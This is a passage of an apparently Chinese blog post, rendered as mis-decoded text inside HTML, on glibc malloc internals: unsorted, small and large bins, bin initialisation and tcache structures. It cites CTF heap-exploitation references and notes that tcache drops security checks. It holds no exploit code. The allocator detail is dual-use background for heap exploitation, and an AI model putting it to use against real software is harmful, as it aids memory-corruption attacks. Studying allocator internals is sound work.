Êú∫Âà∂)„ÄÇÂà©Áî® unsorted binÔºåÂèØ‰ª•Âä†Âø´ÂÜÖÂ≠òÁöÑÂàÜÈÖçÂíåÈáäÊîæÊìç‰ΩúÔºåÂõ†‰∏∫Êï¥‰∏™Êìç‰ΩúÈÉΩ‰∏çÂÜçÈúÄË¶ÅËä±Ë¥πÈ¢ùÂ§ñÁöÑÊó∂Èó¥ÂéªÊü•ÊâæÂêàÈÄÇÁöÑ bin ‰∫Ü„ÄÇ<br>\nUnsorted bin ÁöÑÁâπÊÄßÂ¶Ç‰∏ãÔºö<br>\nunsorted bin ÁöÑ‰∏™Êï∞Ôºö 1 ‰∏™„ÄÇ<br>\nunsorted bin ÊòØ‰∏Ä‰∏™Áî± free chunks ÁªÑÊàêÁöÑÂæ™ÁéØÂèåÈìæË°®„ÄÇ<br>\nÂú® unsorted bin ‰∏≠ÔºåÂØπ chunk ÁöÑÂ§ßÂ∞èÂπ∂Ê≤°ÊúâÈôêÂà∂Ôºå‰ªª‰ΩïÂ§ßÂ∞èÁöÑ chunk ÈÉΩÂèØ‰ª•ÂΩíÂ±ûÂà∞ unsorted bin ‰∏≠„ÄÇ<br>\nunsortedbin ÈááÁî®ÁöÑÈÅçÂéÜÈ°∫Â∫èÊòØ FIFO„ÄÇ</p>\n<h2 id=\"ÂÖ≠-small-bin\"><a class=\"markdownIt-Anchor\" href=\"#ÂÖ≠-small-bin\">#</a> ÂÖ≠„ÄÅSmall Bin</h2>\n<p>Ê¶ÇÂøµÔºöÂ∞è‰∫é 1024 Â≠óËäÇÔºà0x400ÔºâÁöÑ chunk Áß∞‰πã‰∏∫ small chunkÔºåsmall bin Â∞±ÊòØÁî®‰∫éÁÆ°ÁêÜ small chunk ÁöÑ„ÄÇ<br>\nsmall bin ÈìæË°®ÁöÑ‰∏™Êï∞‰∏∫ 62 ‰∏™„ÄÇ<br>\nÂ∞±ÂÜÖÂ≠òÁöÑÂàÜÈÖçÂíåÈáäÊîæÈÄüÂ∫¶ËÄåË®ÄÔºåsmall bin ÊØî larger bin Âø´Ôºå‰ΩÜÊØî fast bin ÊÖ¢„ÄÇ<br>\nÂêàÂπ∂Êìç‰ΩúÔºöÁõ∏ÈÇªÁöÑ free chunk ÈúÄË¶ÅËøõË°åÂêàÂπ∂Êìç‰ΩúÔºåÂç≥ÂêàÂπ∂Êàê‰∏Ä‰∏™Â§ßÁöÑ free chunk„ÄÇÂÖ∑‰ΩìÊìç‰ΩúËßÅ‰∏ãÊñá free (small chunk) ‰ªãÁªç„ÄÇ</p>\n<blockquote>\n<ul>\n<li>\n<p>Small Bin ÈìæË°®ÁöÑÁâπÊÄß</p>\n</li>\n<li>\n<p>ÊØè‰∏™ smallbin ‰πüÊòØ‰∏Ä‰∏™Áî±ÂØπÂ∫î free chunk ÁªÑÊàêÁöÑÂæ™ÁéØÂèåÈìæË°®„ÄÇ</p>\n</li>\n<li>\n<p>small bin ÈááÁî® FIFO (ÂÖàÂÖ•ÂÖàÂá∫) ÁÆóÊ≥ïÔºöÂÜÖÂ≠òÈáäÊîæÊìç‰ΩúÂ∞±Â∞ÜÊñ∞ÈáäÊîæÁöÑ chunk Ê∑ªÂä†Âà∞ÈìæË°®ÁöÑ front end (ÂâçÁ´Ø)ÔºåÂàÜÈÖçÊìç‰ΩúÂ∞±‰ªéÈìæË°®ÁöÑ rear end (Â∞æÁ´Ø) ‰∏≠Ëé∑Âèñ chunk„ÄÇ</p>\n</li>\n<li>\n<p>Âçï‰∏™ smallbin ÈìæË°®‰∏≠ÁöÑ chunk Â§ßÂ∞èÈÉΩÊòØÁõ∏ÂêåÁöÑÔºåÂêÑ‰∏™ smallbin ÈìæË°®‰∏≠ÁöÑ chunk Â§ßÂ∞èÊòØ‰∏çÂêåÁöÑÔºåË∑ü fastbinsY Êï∞ÁªÑÂ≠òÂÇ® fastbin ÈìæÁöÑÂéüÁêÜÊòØÁõ∏ÂêåÁöÑ„ÄÇ<br>\nbins Êï∞ÁªÑÂ≠òÂÇ® small bin ÈìæÊó∂ÔºöÁ¨¨‰∏Ä‰∏™ small bin Èìæ‰∏≠ chunk ÁöÑÂ§ßÂ∞è‰∏∫ 32 Â≠óËäÇÔºåÂêéÁª≠ÊØè‰∏™ small bin ‰∏≠ chunk ÁöÑÂ§ßÂ∞è‰æùÊ¨°Â¢ûÂä†‰∏§‰∏™Êú∫Âô®Â≠óÈïøÔºà32 ‰ΩçÁõ∏Â∑Æ 8 Â≠óËäÇÔºå64 ‰ΩçÁõ∏Â∑Æ 16 Â≠óËäÇÔºâ‚Ä¶ ‰ª•Ê≠§Á±ªÊé®ÔºåË∑ü fastbinsY Êï∞ÁªÑÂ≠òÂÇ® fastbin ÈìæÁöÑÂéüÁêÜÊòØÁõ∏ÂêåÁöÑÔºàÁî®‰∏ãÂõæË°®Á§∫Ôºâ„ÄÇ</p>\n</li>\n<li>\n<p>bin ÈìæÂ≠òÂÇ®ÁöÑÂ§ßÂ∞è‰∏éÊï∞ÁªÑ‰∏ãÊ†áÁöÑÂÖ≥Á≥ªÔºöchun_size=2<em>SIZE_SZ</em>index„ÄÇ</p>\n<p><img data-src=\"/img/bins/2.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc Êìç‰Ωú‰∏é small bin ÁöÑÂàùÂßãÂåñ</p>\n<ul>\n<li>Á±ª‰ºº‰∫é fast binsÔºåÊúÄÂàùÊâÄÊúâÁöÑ small bin ÈÉΩÊòØÁ©∫ÁöÑÔºåÂõ†Ê≠§Âú®ÂØπËøô‰∫õ small bin ÂÆåÊàêÂàùÂßãÂåñ‰πãÂâçÔºåÂç≥‰ΩøÁî®Êà∑ËØ∑Ê±ÇÁöÑÂÜÖÂ≠òÂ§ßÂ∞èÂ±û‰∫é small chunk ‰πü‰∏ç‰ºö‰∫§Áî± small bin ËøõË°åÂ§ÑÁêÜÔºåËÄåÊòØ‰∫§Áî± unsorted bin Â§ÑÁêÜ„ÄÇ</li>\n<li>Â¶ÇÊûú unsorted bin ‰πü‰∏çËÉΩÂ§ÑÁêÜÁöÑËØùÔºåglibc malloc Â∞±‰æùÊ¨°ÈÅçÂéÜÂêéÁª≠ÁöÑÊâÄÊúâ binsÔºåÊâæÂá∫Á¨¨‰∏Ä‰∏™Êª°Ë∂≥Ë¶ÅÊ±ÇÁöÑ binÔºåÂ¶ÇÊûúÊâÄÊúâÁöÑ bin ÈÉΩ‰∏çÊª°Ë∂≥ÁöÑËØùÔºåÂ∞±ËΩ¨ËÄå‰ΩøÁî® top chunkÔºåÂ¶ÇÊûú top chunk Â§ßÂ∞è‰∏çÂ§üÔºåÈÇ£‰πàÂ∞±Êâ©ÂÖÖ top chunkÔºåËøôÊ†∑Â∞±‰∏ÄÂÆöËÉΩÊª°Ë∂≥ÈúÄÊ±Ç‰∫Ü„ÄÇ</li>\n<li>Ê≥®ÊÑèÈÅçÂéÜÂêéÁª≠ bins ‰ª•Âèä‰πãÂêéÁöÑÊìç‰ΩúÂêåÊ†∑Ë¢´ large bin ÊâÄ‰ΩøÁî®ÔºåÂõ†Ê≠§ÔºåÂ∞ÜËøôÈÉ®ÂàÜÂÜÖÂÆπÊîæÂà∞ large bin ÁöÑ malloc Êìç‰Ωú‰∏≠Âä†‰ª•‰ªãÁªç„ÄÇ</li>\n<li>ÈÇ£‰πà glibc malloc ÊòØÂ¶Ç‰ΩïÂàùÂßãÂåñËøô‰∫õ bins ÁöÑÂë¢ÔºüÂõ†‰∏∫Ëøô‰∫õ bin Â±û‰∫é malloc_state ÁªìÊûÑ‰ΩìÔºåÊâÄ‰ª•Âú®ÂàùÂßãÂåñ malloc_state ÁöÑÊó∂ÂÄôÂ∞±‰ºöÂØπËøô‰∫õ bin ËøõË°åÂàùÂßãÂåñÔºå‰ª£Á†ÅÂ¶Ç‰∏ãÔºö\n<ul>\n<li>Â∞Ü bins Êï∞ÁªÑ‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÊàêÂëòÁ¥¢ÂºïÂÄºËÆæÁΩÆ‰∏∫‰∫Ü 1ÔºåËÄå‰∏çÊòØÊàë‰ª¨Â∏∏Áî®ÁöÑ 0 (Âú® bin_at ÂÆè‰∏≠ÔºåËá™Âä®Â∞Ü i ËøõË°å‰∫ÜÂáè 1 Â§ÑÁêÜ)„ÄÇ</li>\n<li>‰ªé‰∏äÈù¢‰ª£Á†ÅÂèØ‰ª•ÁúãÂá∫Âú®ÂàùÂßãÂåñÁöÑÊó∂ÂÄô glibc malloc Â∞ÜÊâÄÊúâ bin ÁöÑÊåáÈíàÈÉΩÊåáÂêë‰∫ÜËá™Â∑± ‚Äî‚Äî ËøôÂ∞±‰ª£Ë°®Ëøô‰∫õ bin ÈÉΩÊòØÁ©∫ÁöÑ„ÄÇ</li>\n</ul>\n</li>\n</ul>\n<p>‚Äã</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">malloc_init_state</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    mbinptr bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">/* Establish circular links for normal bins */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> NBINS<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    bin <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>ËøáÂêéÔºåÂΩìÂÜçÊ¨°Ë∞ÉÁî® malloc (small chunk) ÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúËØ• chunk size ÂØπÂ∫îÁöÑ small bin ‰∏ç‰∏∫Á©∫ÔºåÂ∞±‰ªéËØ• small bin ÈìæË°®‰∏≠ÂèñÂæó small chunk Áªô malloc ‰ΩøÁî®„ÄÇ</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>free Êìç‰Ωú</p>\n<ul>\n<li>small ÁöÑ free ÊØîËæÉÁâπÊÆä„ÄÇÂΩìÈáäÊîæ small chunk ÁöÑÊó∂ÂÄôÔºåÂÖàÊ£ÄÊü•ËØ• chunk Áõ∏ÈÇªÁöÑ chunk ÊòØÂê¶‰∏∫ freeÔºåÂ¶ÇÊûúÊòØÁöÑËØùÂ∞±ËøõË°åÂêàÂπ∂Êìç‰ΩúÔºöÂ∞ÜËøô‰∫õ chunks ÂêàÂπ∂ÊàêÊñ∞ÁöÑ chunkÔºåÁÑ∂ÂêéÂ∞ÜÂÆÉ‰ª¨‰ªé small bin ‰∏≠ÁßªÈô§ÔºåÊúÄÂêéÂ∞ÜÊñ∞ÁöÑ chunk Ê∑ªÂä†Âà∞ unsorted bin ‰∏≠Ôºå‰πãÂêé unsorted bin ËøõË°åÊï¥ÁêÜÂÜçÊ∑ªÂä†Âà∞ÂØπÂ∫îÁöÑ bin Èìæ‰∏äÔºàÂêéÈù¢‰ºöÊúâÂõæ‰ªãÁªçÔºâ„ÄÇ</li>\n</ul>\n</blockquote>\n<h2 id=\"‰∏É-large-bin\"><a class=\"markdownIt-Anchor\" href=\"#‰∏É-large-bin\">#</a> ‰∏É„ÄÅLarge Bin</h2>\n<ul>\n<li>\n<p>Ê¶ÇÂøµÔºöÂ§ß‰∫éÁ≠â‰∫é 1024 Â≠óËäÇÔºà0x400ÔºâÁöÑ chunk Áß∞‰πã‰∏∫ large chunkÔºålarge bin Â∞±ÊòØÁî®‰∫éÁÆ°ÁêÜËøô‰∫õ largechunk ÁöÑ„ÄÇ</p>\n</li>\n<li>\n<p>large bin ÈìæË°®ÁöÑ‰∏™Êï∞‰∏∫ 63 ‰∏™ÔºåË¢´ÂàÜ‰∏∫ 6 ÁªÑ„ÄÇ</p>\n</li>\n<li>\n<p>largechunk ‰ΩøÁî® fd_nextsize„ÄÅbk_nextsize ËøûÊé•Ëµ∑Êù•ÁöÑ„ÄÇ</p>\n</li>\n<li>\n<p>ÂêàÂπ∂Êìç‰ΩúÔºöÁ±ª‰ºº‰∫é small bin„ÄÇ</p>\n</li>\n</ul>\n<blockquote>\n<p>Large Bin ÈìæË°®ÁöÑÁâπÊÄß</p>\n<ul>\n<li>Âêå‰∏Ä‰∏™ largebin ‰∏≠ÊØè‰∏™ chunk ÁöÑÂ§ßÂ∞èÂèØ‰ª•‰∏ç‰∏ÄÊ†∑ÔºåËøô‰∫õ chunk Ê†πÊçÆ‰∏ÄÂÆöÁöÑËåÉÂõ¥Â≠òÂÇ®Âú®‰∏Ä‰∏™ larbin ÈìæË°®‰∏≠„ÄÇ</li>\n<li>large chunk ÂèØ‰ª•Ê∑ªÂä†„ÄÅÂà†Èô§Âú® large bin ÁöÑ‰ªª‰Ωï‰∏Ä‰∏™‰ΩçÁΩÆ„ÄÇ</li>\n<li>Âú®Ëøô 63 ‰∏™ largebins ‰∏≠ÔºöÁ¨¨‰∏ÄÁªÑÁöÑ 32 ‰∏™ largebin Èìæ‰æùÊ¨°‰ª• 64 Â≠óËäÇÊ≠•Èïø‰∏∫Èó¥ÈöîÔºåÂç≥Á¨¨‰∏Ä‰∏™ largebin Èìæ‰∏≠ chunksize ‰∏∫ 1024-1087 Â≠óËäÇÔºåÁ¨¨‰∫å‰∏™ large bin ‰∏≠ chunk size ‰∏∫ 1088~1151 Â≠óËäÇ„ÄÇÁ¨¨‰∫åÁªÑÁöÑ 16 ‰∏™ largebin Èìæ‰æùÊ¨°‰ª• 512 Â≠óËäÇÊ≠•Èïø‰∏∫Èó¥ÈöîÔºõÁ¨¨‰∏âÁªÑÁöÑ 8 ‰∏™ largebin Èìæ‰ª•Ê≠•Èïø 4096 ‰∏∫Èó¥ÈöîÔºõÁ¨¨ÂõõÁªÑÁöÑ 4 ‰∏™ largebin Èìæ‰ª• 32768 Â≠óËäÇ‰∏∫Èó¥ÈöîÔºõÁ¨¨‰∫îÁªÑÁöÑ 2 ‰∏™ largebin Èìæ‰ª• 262144 Â≠óËäÇ‰∏∫Èó¥ÈöîÔºõÊúÄÂêé‰∏ÄÁªÑÁöÑ largebin Èìæ‰∏≠ÁöÑ chunk Â§ßÂ∞èÊó†ÈôêÂà∂„ÄÇ</li>\n</ul>\n<p><img data-src=\"/img/bins/3.jpg\" alt=\"img\"></p>\n<ul>\n<li>Âú®Âêå‰∏Ä‰∏™ largebin ‰∏≠ÔºöÊØè‰∏™ chunk ÁöÑÂ§ßÂ∞è‰∏ç‰∏ÄÂÆöÁõ∏ÂêåÔºåÂõ†Ê≠§‰∏∫‰∫ÜÂä†Âø´ÂÜÖÂ≠òÂàÜÈÖçÂíåÈáäÊîæÁöÑÈÄüÂ∫¶ÔºåÂ∞±Â∞ÜÂêå‰∏Ä‰∏™ largebin ‰∏≠ÁöÑÊâÄÊúâ chunk ÊåâÁÖß chunksize ËøõË°å‰ªéÂ§ßÂà∞Â∞èÁöÑÊéíÂàóÔºöÊúÄÂ§ßÁöÑ chunk ÊîæÂú®‰∏Ä‰∏™ÈìæË°®ÁöÑ front endÔºåÊúÄÂ∞èÁöÑ chunk ÊîæÂú® rear endÔºõÁõ∏ÂêåÂ§ßÂ∞èÁöÑ chunk ÊåâÁÖßÊúÄËøë‰ΩøÁî®È°∫Â∫èÊéíÂ∫è„ÄÇ</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"ÈìæË°®Á¥¢ÂºïÂÆèÂÆö‰πâlargebin_index\"><a class=\"markdownIt-Anchor\" href=\"#ÈìæË°®Á¥¢ÂºïÂÆèÂÆö‰πâlargebin_index\">#</a> ÈìæË°®Á¥¢ÂºïÂÆèÂÆö‰πâÔºöÔºàlargebin_indexÔºâ</h3>\n<ul>\n<li>\n<p>ÂèÇÊï∞‰∏∫ÈìæË°®ËÉΩÂ≠òÂÇ®ÁöÑ chunk Â§ßÂ∞èÔºåÂÆèÂÆö‰πâ‰∏≠ÊúâÁÆÄ‰ªãË∞ÉÁî®ÂÖ∂‰ªñÂÆèÂÆö‰πâ„ÄÇ</p>\n</li>\n<li>\n<p>‰æãÂ¶ÇÔºöÁ¨¨‰∏Ä‰∏™ largebin ÁöÑËµ∑ÂßãÂ§ßÂ∞è‰∏∫ 1024ÔºåÈÇ£‰πà 1024&gt;&gt;6=16ÔºåÊâÄ‰ª•ÂÖ∂Âú® bins Êï∞ÁªÑ‰∏≠ÁöÑ‰∏ãÊ†á‰∏∫ 48+16=64„ÄÇ</p>\n<p><img data-src=\"/img/bins/5.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc Êìç‰Ωú‰∏é large bin ÁöÑÂàùÂßãÂåñ</p>\n<ul>\n<li>ÂàùÂßãÂåñÂÆåÊàê‰πãÂâçÁöÑÊìç‰ΩúÁ±ª‰ºº‰∫é small bin„ÄÇ</li>\n<li>‰∏ãÈù¢ËÆ®ËÆ∫ large bins ÂàùÂßãÂåñÂÆåÊàê‰πãÂêéÁöÑÊìç‰ΩúÔºö\n<ul>\n<li>È¶ñÂÖàÁ°ÆÂÆöÁî®Êà∑ËØ∑Ê±ÇÁöÑÂ§ßÂ∞èÂ±û‰∫éÂì™‰∏Ä‰∏™ large binÔºåÁÑ∂ÂêéÂà§Êñ≠ËØ• large bin ‰∏≠ÊúÄÂ§ßÁöÑ chunk ÁöÑ size ÊòØÂê¶Â§ß‰∫éÁî®Êà∑ËØ∑Ê±ÇÁöÑ size (Âè™ÈúÄË¶ÅÂØπÊØîÈìæË°®‰∏≠ front end ÁöÑ size Âç≥ÂèØ)„ÄÇÂ¶ÇÊûúÂ§ß‰∫éÔºåÂ∞±‰ªé rear end ÂºÄÂßãÈÅçÂéÜËØ• large binÔºåÊâæÂà∞Á¨¨‰∏Ä‰∏™ size Áõ∏Á≠âÊàñÊé•ËøëÁöÑ chunkÔºåÂàÜÈÖçÁªôÁî®Êà∑„ÄÇÂ¶ÇÊûúËØ• chunk Â§ß‰∫éÁî®Êà∑ËØ∑Ê±ÇÁöÑ size ÁöÑËØùÔºåÂ∞±Â∞ÜËØ• chunk ÊãÜÂàÜ‰∏∫‰∏§‰∏™ chunkÔºöÂâçËÄÖËøîÂõûÁªôÁî®Êà∑Ôºå‰∏î size Á≠âÂêå‰∫éÁî®Êà∑ËØ∑Ê±ÇÁöÑ sizeÔºõÂâ©‰ΩôÁöÑÈÉ®ÂàÜÂÅö‰∏∫‰∏Ä‰∏™Êñ∞ÁöÑ chunk Ê∑ªÂä†Âà∞ unsorted bin ‰∏≠„ÄÇ</li>\n<li>Â¶ÇÊûúËØ• large bin ‰∏≠ÊúÄÂ§ßÁöÑ chunk ÁöÑ size Â∞è‰∫éÁî®Êà∑ËØ∑Ê±ÇÁöÑ size ÁöÑËØùÔºåÈÇ£‰πàÂ∞±‰æùÊ¨°Êü•ÁúãÂêéÁª≠ÁöÑ large bin ‰∏≠ÊòØÂê¶ÊúâÊª°Ë∂≥ÈúÄÊ±ÇÁöÑ chunkÔºå‰∏çËøáÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÈâ¥‰∫é bin ÁöÑ‰∏™Êï∞ËæÉÂ§ö (‰∏çÂêå bin ‰∏≠ÁöÑ chunk ÊûÅÊúâÂèØËÉΩÂú®‰∏çÂêåÁöÑÂÜÖÂ≠òÈ°µ‰∏≠)ÔºåÂ¶ÇÊûúÊåâÁÖß‰∏ä‰∏ÄÊÆµ‰∏≠‰ªãÁªçÁöÑÊñπÊ≥ïËøõË°åÈÅçÂéÜÁöÑËØù (Âç≥ÈÅçÂéÜÊØè‰∏™ bin ‰∏≠ÁöÑ chunk)ÔºåÂ∞±ÂèØËÉΩ‰ºöÂèëÁîüÂ§öÊ¨°ÂÜÖÂ≠òÈ°µ‰∏≠Êñ≠Êìç‰ΩúÔºåËøõËÄå‰∏•ÈáçÂΩ±ÂìçÊ£ÄÁ¥¢ÈÄüÂ∫¶ÔºåÊâÄ‰ª• glibc malloc ËÆæËÆ°‰∫Ü Binmap ÁªìÊûÑ‰ΩìÊù•Â∏ÆÂä©ÊèêÈ´ò bin-by-bin Ê£ÄÁ¥¢ÁöÑÈÄüÂ∫¶„ÄÇBinmap ËÆ∞ÂΩï‰∫ÜÂêÑ‰∏™ bin ‰∏≠ÊòØÂê¶‰∏∫Á©∫ÔºåÈÄöËøá bitmap ÂèØ‰ª•ÈÅøÂÖçÊ£ÄÁ¥¢‰∏Ä‰∫õÁ©∫ÁöÑ bin„ÄÇÂ¶ÇÊûúÈÄöËøá binmap ÊâæÂà∞‰∫Ü‰∏ã‰∏Ä‰∏™ÈùûÁ©∫ÁöÑ large bin ÁöÑËØùÔºåÂ∞±ÊåâÁÖß‰∏ä‰∏ÄÊÆµ‰∏≠ÁöÑÊñπÊ≥ïÂàÜÈÖç chunkÔºåÂê¶ÂàôÂ∞±‰ΩøÁî® top chunk Êù•ÂàÜÈÖçÂêàÈÄÇÁöÑÂÜÖÂ≠ò„ÄÇ</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"freeÊìç‰Ωú\"><a class=\"markdownIt-Anchor\" href=\"#freeÊìç‰Ωú\">#</a> free Êìç‰Ωú</h3>\n<ul>\n<li>\n<p>Á±ª‰ºº‰∫é small chunk„ÄÇ</p>\n<p><img data-src=\"/img/bins/6.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"ÂÖ´-tcache\"><a class=\"markdownIt-Anchor\" href=\"#ÂÖ´-tcache\">#</a> ÂÖ´„ÄÅtcache</h2>\n<p>cache ÊòØ glibc 2.26 (ubuntu 17.10) ‰πãÂêéÂºïÂÖ•ÁöÑ‰∏ÄÁßçÊäÄÊúØÔºàsee <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9naXQvP3A9Z2xpYmMuZ2l0O2E9Y29tbWl0ZGlmZjtoPWQ1YzNmYWZjNDMwN2M5YjdhNGM3ZDVjYjM4MWZjZGJmYWQzNDBiY2M=\">commit</span>ÔºâÔºåÁõÆÁöÑÊòØÊèêÂçáÂ†ÜÁÆ°ÁêÜÁöÑÊÄßËÉΩ„ÄÇ‰ΩÜÊèêÂçáÊÄßËÉΩÁöÑÂêåÊó∂ËàçÂºÉ‰∫ÜÂæàÂ§öÂÆâÂÖ®Ê£ÄÊü•Ôºå‰πüÂõ†Ê≠§Êúâ‰∫ÜÂæàÂ§öÊñ∞ÁöÑÂà©Áî®ÊñπÂºè„ÄÇ</p>\n<blockquote>\n<p>‰∏ªË¶ÅÂèÇËÄÉ‰∫Ü glibc Ê∫êÁ†ÅÔºåangelboy ÁöÑ slide ‰ª•Âèä tukan.farmÔºåÈìæÊé•ÈÉΩÊîæÂú®ÊúÄÂêé‰∫Ü„ÄÇ</p>\n</blockquote>\n<p>Áõ∏ÂÖ≥ÁªìÊûÑ‰Ωì <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18x\">¬∂</span></p>\n<p>tcache ÂºïÂÖ•‰∫Ü‰∏§‰∏™Êñ∞ÁöÑÁªìÊûÑ‰ΩìÔºå <code>tcache_entry</code>  Âíå  <code>tcache_perthread_struct</code> „ÄÇ</p>\n<p>ËøôÂÖ∂ÂÆûÂíå fastbin ÂæàÂÉèÔºå‰ΩÜÂèà‰∏ç‰∏ÄÊ†∑„ÄÇ</p>\n<p>tcache_entry<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9lbnRyeQ==\">¬∂</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2VudHJ5\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* We overlay this structure on the user-data portion of a chunk when</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   the chunk is stored in the per-thread cache.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_entry<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>tcache_entry</code>  Áî®‰∫éÈìæÊé•Á©∫Èó≤ÁöÑ chunk ÁªìÊûÑ‰ΩìÔºåÂÖ∂‰∏≠ÁöÑ  <code>next</code>  ÊåáÈíàÊåáÂêë‰∏ã‰∏Ä‰∏™Â§ßÂ∞èÁõ∏ÂêåÁöÑ chunk„ÄÇ</p>\n<p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÈáåÁöÑ next ÊåáÂêë chunk ÁöÑ user dataÔºåËÄå fastbin ÁöÑ fd ÊåáÂêë chunk ÂºÄÂ§¥ÁöÑÂú∞ÂùÄ„ÄÇ</p>\n<p>ËÄå‰∏îÔºåtcache_entry ‰ºöÂ§çÁî®Á©∫Èó≤ chunk ÁöÑ user data ÈÉ®ÂàÜ„ÄÇ</p>\n<p>tcache_perthread_struct<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wZXJ0aHJlYWRfc3RydWN0\">¬∂</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX3BlcnRocmVhZF9zdHJ1Y3Q=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* There is one of these for each thread, which contains the</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   per-thread cache (hence \"tcache_perthread_struct\").  Keeping</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   overall size low is mildly important.  Note that COUNTS and ENTRIES</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   are redundant (we could have just counted the linked list each</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   time), this is for performance reasons.  */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">char</span> counts<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>entries<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_perthread_struct<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token 